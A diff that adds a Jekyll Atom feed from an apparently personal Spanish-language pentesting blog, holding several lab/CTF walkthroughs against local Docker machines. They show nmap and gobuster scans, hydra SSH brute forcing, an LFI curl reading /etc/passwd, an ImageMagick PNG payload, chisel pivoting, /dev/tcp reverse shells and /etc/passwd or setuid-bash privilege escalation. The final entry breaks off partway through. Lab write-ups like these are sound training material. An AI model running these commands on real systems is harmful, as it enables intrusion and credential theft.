@@ -1,0 +1,575 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-05T13:04:15-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mi Sitio Hacker</title><subtitle>Un sitio con estilo hacker para pentesting y labs.</subtitle><entry><title type="html">ChocolateFire</title><link href="http://localhost:4000/pentesting/2024/12/03/ChocolateFire.html" rel="alternate" type="text/html" title="ChocolateFire" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/ChocolateFire</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/ChocolateFire.html"><![CDATA[<p>Corremos la maquina y escaneamos los puertos</p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn   172.17.0.2</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241124154027.png" alt="[Pasted image 20241124154027.png]" /></p>
+
+<p>encuentro un login en el puerto 9090</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241124154102.png" alt="[Pasted image 20241124154102.png]" /></p>
+
+<p>uso burpsuite para encntrar las credenciales</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241124154158.png" alt="[Pasted image 20241124154158.png]" /></p>
+
+<p>encuentro las credenciales admin:admin</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241124154247.png" alt="[Pasted image 20241124154247.png]" />
+<img src="/imagenes/Pasted%20image%2020241124154325.png" alt="[Pasted image 20241124154325.png]" /></p>
+
+<p>navegamos por el sitio y vemos algo interesante que es la version del server openfire buscamos en metasploit si existe algun sploit para este</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241124154511.png" alt="[Pasted image 20241124154511.png]" /></p>
+
+<p>usamos show options para ver y modificar los parametros necesarios</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241124154624.png" alt="[Pasted image 20241124154624.png]" /></p>
+
+<p>cambiamos los valores necesarios</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241124154729.png" alt="[Pasted image 20241124154729.png]" />
+<img src="/imagenes/Pasted%20image%2020241124154758.png" alt="[Pasted image 20241124154758.png]" /></p>
+
+<p>y conseguimos ser root</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241124154955.png" alt="[Pasted image 20241124154955.png]" /></p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[Corremos la maquina y escaneamos los puertos]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">ChocolateLovers</title><link href="http://localhost:4000/pentesting/2024/12/03/Chocolatelovers.html" rel="alternate" type="text/html" title="ChocolateLovers" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/Chocolatelovers</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/Chocolatelovers.html"><![CDATA[<p>Corremos la maquina</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125164947.png" alt="[Pasted image 20241125164947.png]" /></p>
+
+<p>escaneamos puertos
+<code class="language-plaintext highlighter-rouge">nmap -p- --open -sCSV -vvv -Pn -n --min-rate 5000 172.17.0.2</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125165059.png" alt="[Pasted image 20241125165059.png]" /></p>
+
+<p>solo esta abierto el puerto 80 entramos en el navegador</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125165140.png" alt="[Pasted image 20241125165140.png]" /></p>
+
+<p>buscamos en codigo de la pagina</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125165205.png" alt="[Pasted image 20241125165205.png]" /></p>
+
+<p>encontramos esto muy llamativo escaneamos la ip en busca directorios y no encontramos nada asi que probamos con lo encontrado anteriormente</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125165327.png" alt="[Pasted image 20241125165327.png]" /></p>
+
+<p>encontramos un login de admin y por suerte estaba con credenciales por default admin:admin</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125165437.png" alt="[Pasted image 20241125165437.png]" /></p>
+
+<p>navegamos por el sitio y encontramos que en la opcion plugins podemos subir cualquier archivo asi que montamos una revershell usamos la de monkey</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125165621.png" alt="[Pasted image 20241125165621.png]" /></p>
+
+<p>buscamos directorios con la nueva ip http://172.17.0.2/nibbleblog/ y encontramos varios directorios y vemos que en el directorio conten encontramos nuestro archivo de rever shell</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125165817.png" alt="[Pasted image 20241125165817.png]" />
+<img src="/imagenes/Pasted%20image%2020241125165837.png" alt="[Pasted image 20241125165837.png]" /></p>
+
+<p>tenemos acceso y listamos los directorios con sudo -l</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125170121.png" alt="[Pasted image 20241125170121.png]" /></p>
+
+<p>encontramos como escalar privilegios en el usuario chocolate</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125170226.png" alt="[Pasted image 20241125170226.png]" />
+<img src="/imagenes/Pasted%20image%2020241125170307.png" alt="[Pasted image 20241125170307.png]" /></p>
+
+<p>ya somos chocolate navegamos en los directorios y encontramos un script en el dir opt</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125170408.png" alt="[Pasted image 20241125170408.png]" /></p>
+
+<p>con el comando ps = faux descubrimos que el usuario root puede ejecuatar el script</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125170614.png" alt="[Pasted image 20241125170614.png]" /></p>
+
+<p>modificamos el contenido de el script con este comando <code class="language-plaintext highlighter-rouge">echo '&lt;?php exec("chmod u+s /bin/bash"); ?&gt;' &gt; /opt/script.php</code> y somos root</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241125170832.png" alt="[Pasted image 20241125170832.png]" /></p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[Corremos la maquina]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Colletions</title><link href="http://localhost:4000/pentesting/2024/12/03/Collections.html" rel="alternate" type="text/html" title="Colletions" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/Collections</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/Collections.html"><![CDATA[<p><img src="/imagenes/Pasted%20image%2020241126143259.png" alt="[Pasted image 20241126143259.png]" /></p>
+
+<p>escaneamos puertos con nmap  <code class="language-plaintext highlighter-rouge">nmap -p- --open -sCSV -vvv -Pn -n --min-rate 5000 172.17.0.2</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126143428.png" alt="[Pasted image 20241126143428.png]" /></p>
+
+<p>entramos en el navegador</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126143553.png" alt="[Pasted image 20241126143553.png]" /></p>
+
+<p>buscamos directorios con goubuster <code class="language-plaintext highlighter-rouge">gobuster dir -u "http://172.17.0.2/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126143720.png" alt="[Pasted image 20241126143720.png]" /></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126143741.png" alt="[Pasted image 20241126143741.png]" /></p>
+
+<p>si interactuamos con el sitio web debemos anadir el colletions.dl al host <code class="language-plaintext highlighter-rouge">sudo nano /etc/hosts</code>  control O, control x luego enter
+luego busco directorios en la nueva direccion</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126144527.png" alt="[Pasted image 20241126144527.png]" />
+<img src="/imagenes/Pasted%20image%2020241126144630.png" alt="[Pasted image 20241126144630.png]" /></p>
+
+<p>al ver que es wordprees tarto de buscar vulneravilidades con wpscan <code class="language-plaintext highlighter-rouge">wpscan --url http://collections.dl/wordpress/ -e u</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126145500.png" alt="[Pasted image 20241126145500.png]" />
+<img src="/imagenes/Pasted%20image%2020241126145523.png" alt="[Pasted image 20241126145523.png]" /></p>
+
+<p>buscamos un sploit para el plugin
+<code class="language-plaintext highlighter-rouge">searchsploit site editor 1.1</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126145643.png" alt="[Pasted image 20241126145643.png]" /></p>
+
+<p>en sploit db encontramos como vulnerar ese plugin</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126145734.png" alt="[Pasted image 20241126145734.png]" /></p>
+
+<p>curl “http://172.17.0.2/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd”</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126145827.png" alt="[Pasted image 20241126145827.png]" /></p>
+
+<p>encontramos los usuarios dbadmin, root y el anteriormente encontrado chocolate usamos hydra para encontrar una contrasena para chocolate
+<code class="language-plaintext highlighter-rouge">hydra -l chocolate -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126145956.png" alt="[Pasted image 20241126145956.png]" /></p>
+
+<p>entramos por ssh  vemos que no tenemos permisos sudo y en el directorio tmp encontramos una base de datos mongo recordamos mongo corre en el puerto 27017</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126150107.png" alt="[Pasted image 20241126150107.png]" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">mongo --host 172.17.0.2:27017</code> este comando desde la maquina atacante se debe instalar mongo para que funcione</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126154311.png" alt="[Pasted image 20241126154311.png]" /></p>
+
+<p>entramos desde el ssh con las nuevas credenciales y vemos que el usuario root tiene la misma contrasena que el dbadmin</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126154456.png" alt="[Pasted image 20241126154456.png]" /></p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">ConsoleLog</title><link href="http://localhost:4000/pentesting/2024/12/03/ConsoleLog.html" rel="alternate" type="text/html" title="ConsoleLog" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/ConsoleLog</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/ConsoleLog.html"><![CDATA[<p><img src="/imagenes/Pasted%20image%2020241126164801.png" alt="[Pasted image 20241126164801.png]" /></p>
+
+<p>usamos nmap para explorar los puertos <code class="language-plaintext highlighter-rouge">nmap -p- --open -sCSV -vvv -Pn -n --min-rate 5000 172.17.0.2</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126164937.png" alt="[Pasted image 20241126164937.png]" /></p>
+
+<p>entramos en el navegador</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126165029.png" alt="[Pasted image 20241126165029.png]" /></p>
+
+<p>listamos directorios con goubuster <code class="language-plaintext highlighter-rouge">gobuster dir -u "http://172.17.0.2/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126165146.png" alt="[Pasted image 20241126165146.png]" /></p>
+
+<p>navegamos en las nuevas dirreciones y encontramos un archivo server.js</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126165348.png" alt="[Pasted image 20241126165348.png]" /></p>
+
+<p>encontramos una posible contrasena</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126165418.png" alt="[Pasted image 20241126165418.png]" /></p>
+
+<p>probmaos con hydra para encontrar un usuario `hydra -L  /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas  ssh://172.17.0.2:5000 -t 4</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126165541.png" alt="[Pasted image 20241126165541.png]" /></p>
+
+<p>entramos por ssh</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126165655.png" alt="[Pasted image 20241126165655.png]" /></p>
+
+<p>no tenemos permisos sudo asi que vemos en suid que permisos tenemos <code class="language-plaintext highlighter-rouge">find \-perm -4000 -user root 2&gt;/dev/null</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126165841.png" alt="[Pasted image 20241126165841.png]" /></p>
+
+<p>vemos que tenemos en la ruta passwd</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126165932.png" alt="[Pasted image 20241126165932.png]" /></p>
+
+<p>como tenemos permisos de nano modificamos el archivo passwd y eliminamos la “x” en el root con el comando <code class="language-plaintext highlighter-rouge">sudo nano passwd</code>  luego control x y ENTER</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126170148.png" alt="[Pasted image 20241126170148.png]" /></p>
+
+<p>vemos que se modifico sin errores y probamos hacermos root  con <code class="language-plaintext highlighter-rouge">su root</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241126170243.png" alt="[Pasted image 20241126170243.png]" /></p>
+
+<p>END</p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Dark</title><link href="http://localhost:4000/pentesting/2024/12/03/Dark.html" rel="alternate" type="text/html" title="Dark" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/Dark</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/Dark.html"><![CDATA[<p>iniciamos la maquina</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128143740.png" alt="[Pasted image 20241128143740.png]" /></p>
+
+<p>escaneamos los puertos con nmap <code class="language-plaintext highlighter-rouge">nmap -p- --open -sCSV -vvv -Pn -n --min-rate 5000 10.10.10.0/24</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128143914.png" alt="[Pasted image 20241128143914.png]" /></p>
+
+<p>entramos en el navegador</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128144002.png" alt="[Pasted image 20241128144002.png]" /></p>
+
+<p>usamos gobuster para buscar directorios <code class="language-plaintext highlighter-rouge">gobuster dir -u "http://10.10.10.2/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128144211.png" alt="[Pasted image 20241128144211.png]" /></p>
+
+<p>encontramos algo interesante llamado info buscamos en el cuadro de busqueda la ruta info</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128144306.png" alt="[Pasted image 20241128144306.png]" /></p>
+
+<p>encontramos un posible usuario y usamos hydra para encontrar la contrasena <code class="language-plaintext highlighter-rouge">hydra -l toni -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2 -t 10</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128144433.png" alt="[Pasted image 20241128144433.png]" /></p>
+
+<p>entramos por ssh</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128144531.png" alt="[Pasted image 20241128144531.png]" /></p>
+
+<p>desde la maquina atacante <code class="language-plaintext highlighter-rouge">chisel server --reverse -p 1234</code>; con este comando montamos un servidor en nuestra maquina atacante para que desde la maquina victima se pueda descargar el chisel <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128144914.png" alt="[Pasted image 20241128144914.png]" /></p>
+
+<p>usamos chisel para hacer pivoting con la maquina 20.20.20.3 que encontramos en info  con este comando descargamos chisel 
+<code class="language-plaintext highlighter-rouge">curl -L http://172.0.1/chisel_1.10.1_linux_amd64 -o chisel</code> le damos permisos de escritura con el comando <code class="language-plaintext highlighter-rouge">chmod +x chisel</code> y corremos el chisel en modo cliente desde la maquina victima</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128144657.png" alt="[Pasted image 20241128144657.png]" /></p>
+
+<p>ya con la conexion agregamos el proxi usamos foxyproxy</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128145158.png" alt="[Pasted image 20241128145158.png]" /></p>
+
+<p>vamos al navegador con la nueva direccion 20.20.20.3</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128145258.png" alt="[Pasted image 20241128145258.png]" /></p>
+
+<p>probamos si se puede ejecutar codigo usamos id</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128145343.png" alt="[Pasted image 20241128145343.png]" /></p>
+
+<p>asi que nos enviamos una revershell con el comando <code class="language-plaintext highlighter-rouge">bash -c 'bash -i &gt;&amp; /dev/tcp/20.20.20.2/4444 0&gt;&amp;1'</code> en la maquina atacante nos colocamos en escucha en el puerto 4444</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128150246.png" alt="[Pasted image 20241128150246.png]" /></p>
+
+<p>estando dentro le damos el tratamiento tty 
+<code class="language-plaintext highlighter-rouge">script /dev/null -c bash</code>
+<code class="language-plaintext highlighter-rouge">Control + z</code>
+<code class="language-plaintext highlighter-rouge">stty raw -echo;fg</code>
+<code class="language-plaintext highlighter-rouge">reset xterm</code>
+<code class="language-plaintext highlighter-rouge">export TERM=xterm</code>
+<code class="language-plaintext highlighter-rouge">export SHELL=bash</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128145714.png" alt="[Pasted image 20241128145714.png]" /></p>
+
+<p>nos copiamos el contenido de /etc/passwd en el directorio tmp con el codigo <code class="language-plaintext highlighter-rouge">cp /etc/passwd /tmp/passwd</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128145849.png" alt="[Pasted image 20241128145849.png]" /></p>
+
+<p>se modifica el contenido borrando la x en root para no tener la necesidad de una contrasena y luego se actualiza el archivo passwd en etc desde el archivo passwd tmp <code class="language-plaintext highlighter-rouge">curl file:///tmp/passwd -o /etc/passwd</code> verificamos que se hizo el cambio  <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128150102.png" alt="[Pasted image 20241128150102.png]" /></p>
+
+<p>listo nos hacemos root</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241128150210.png" alt="[Pasted image 20241128150210.png]" /></p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[iniciamos la maquina]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">DebugMe</title><link href="http://localhost:4000/pentesting/2024/12/03/DebugMe.html" rel="alternate" type="text/html" title="DebugMe" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/DebugMe</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/DebugMe.html"><![CDATA[<p>inicamos la maquina</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129223334.png" alt="Pasted image 20241129223334.png" /></p>
+
+<p>escaneamos los puertos con nmap <code class="language-plaintext highlighter-rouge">nmap -p- --open -sCSV -vvv -Pn -n --min-rate 5000 172.17.0.2</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129223445.png" alt="[Pasted image 20241129223445.png]" /></p>
+
+<p>entramos en el navegador en la direccion ip</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129223640.png" alt="[Pasted image 20241129223640.png]" /></p>
+
+<p>usamos nikto para encontrar alguna vulneravilidad en el sitio <code class="language-plaintext highlighter-rouge">nikto -h http://172.17.0.2/ -Tuning 5 -Display V -o nikto.html -Format html</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129223851.png" alt="[Pasted image 20241129223851.png]" /></p>
+
+<p>encontramos que es vulnerable a LFI pero no logramos ningun resultado haces fuzzin con gobuster 
+<code class="language-plaintext highlighter-rouge">gobuster dir -u "http://172.17.0.2/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html</code>,</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129224041.png" alt="[Pasted image 20241129224041.png]" /></p>
+
+<p>navegamos pero no encontramos nada interesante pero en info.php encontramos un modulo interesante que usa para redimencionar las imagenes</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129224237.png" alt="[Pasted image 20241129224237.png]" /></p>
+
+<p>busco un poco sobre el modulo https://www.hackplayers.com/2023/02/imagemagick-la-vulnerabilidad-oculta.html , https://imagetragick.com/</p>
+
+<p>instalamos las dependencias recomendadas <code class="language-plaintext highlighter-rouge">sudo apt install pngcrush imagemagick exiftool exiv2 -y</code></p>
+
+<p>incertamos codigo malicioso tipo LFI en una imagen con este codigo <code class="language-plaintext highlighter-rouge">pngcrush -text a "profile" "/etc/passwd" yo.png</code>
+verificamos que la este inscrustado el codigo con el comando <code class="language-plaintext highlighter-rouge">exiv2 -pS pngout.png</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129224714.png" alt="[Pasted image 20241129224714.png]" /></p>
+
+<p>subimos nuestra imagen corrupta en el sitio y la redimencionamos</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129224852.png" alt="[Pasted image 20241129224852.png]" /></p>
+
+<p>descargamos cualquiera de las imagenes y vemos si se ejecuto el comando <code class="language-plaintext highlighter-rouge">identify -verbose aca.png</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129225014.png" alt="[Pasted image 20241129225014.png]" /></p>
+
+<p>obtuvimos esta cadena que esta en formato hex asi que usamos python para hacerlo legible con el siguiente comando
+<code class="language-plaintext highlighter-rouge">python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f7661722f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a6170706c69636174696f6e3a783a313030303a313030303a3a2f686f6d652f6170706c69636174696f6e3a2f62696e2f626173680a73797374656d642d6e6574776f726b3a783a3130313a3130343a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d642f6e657469663a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130353a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d642f7265736f6c76653a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130363a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130343a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a6c656e616d3a783a313030313a313030313a3a2f686f6d652f6c656e616d3a2f62696e2f626173680a").decode("utf-8"))'</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129225219.png" alt="[Pasted image 20241129225219.png]" /></p>
+
+<p>conseguimos los usuarios y hacemos fuerza bruta con hydra 
+<code class="language-plaintext highlighter-rouge">hydra -l lenam -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129225323.png" alt="[Pasted image 20241129225323.png]" /></p>
+
+<p>entramos por ssh <code class="language-plaintext highlighter-rouge">ssh -p22 lenam@172.17.0.2</code>   listamos los servicio <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129225441.png" alt="[Pasted image 20241129225441.png]" /></p>
+
+<p>con chatgpt trato de buscar como escalar privilegios</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129225615.png" alt="[Pasted image 20241129225615.png]" /></p>
+
+<p>encontramos que un proceso node esta ejecutandose</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129225713.png" alt="[Pasted image 20241129225713.png]" /></p>
+
+<p>vemos en que puerto esta corriendo el proceso</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129225759.png" alt="[Pasted image 20241129225759.png]" /></p>
+
+<p>y vemos el proceso usando curl</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129225841.png" alt="[Pasted image 20241129225841.png]" /></p>
+
+<p>procedemos a matar el proceso con el comando <code class="language-plaintext highlighter-rouge">sudo /bin/kill -s SIGUSR1 $(ps aux | grep node | grep root | awk '{print $2}')</code>
+paar que se reinicie el servicio de node a valores predeterminados</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129233004.png" alt="[Pasted image 20241129230004.png]" /></p>
+
+<p>procedemos ah iniciar el inspector de node <code class="language-plaintext highlighter-rouge">node inspect 127.0.0.1:9229</code>
+nos colocamos en escucha en la maquina atacante  <code class="language-plaintext highlighter-rouge">nc -lvnp 5000</code>
+luego nos pasamos una revershell  <code class="language-plaintext highlighter-rouge">exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/&lt;su ip&gt;/5000 0&gt;&amp;1\"')")</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129230322.png" alt="[Pasted image 20241129230322.png]" /></p>
+
+<p>tenemos la reversehll y listo somos root</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241129230410.png" alt="[Pasted image 20241129230410.png]" /></p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[inicamos la maquina]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">BorazuwarahCtf</title><link href="http://localhost:4000/pentesting/2024/12/03/borazuwarahctf.html" rel="alternate" type="text/html" title="BorazuwarahCtf" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/borazuwarahctf</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/borazuwarahctf.html"><![CDATA[<p>ejecutamos la maquina docker con los comandos</p>
+
+<p>sudo bash auto_deploy.sh borazuwarahctf.tar</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121111116.png" alt="[Pasted image 20241121111116.png]" /></p>
+
+<p>escaneamos la ip de la maquina usando namp 
+ nmap -p- –open -sCVS -vvv -Pn -n –min-rate 5000 172.17.0.2</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121105658.png" alt="[Pasted image 20241121105658.png]" /></p>
+
+<p>encontramos los puertos 22 para ssh y 80 para http abiertos</p>
+
+<p>entramos en el navegador con la direccion ip 172.17.0.2</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121105825.png" alt="[Pasted image 20241121105825.png]" /></p>
+
+<p>inspections de la pagina web encontramos un archivo imagen</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121105944.png" alt="[Pasted image 20241121105944.png]" /></p>
+
+<p>la descargamos y aplicamos esenografia para ver que informacion valiosa podemos encontrar</p>
+
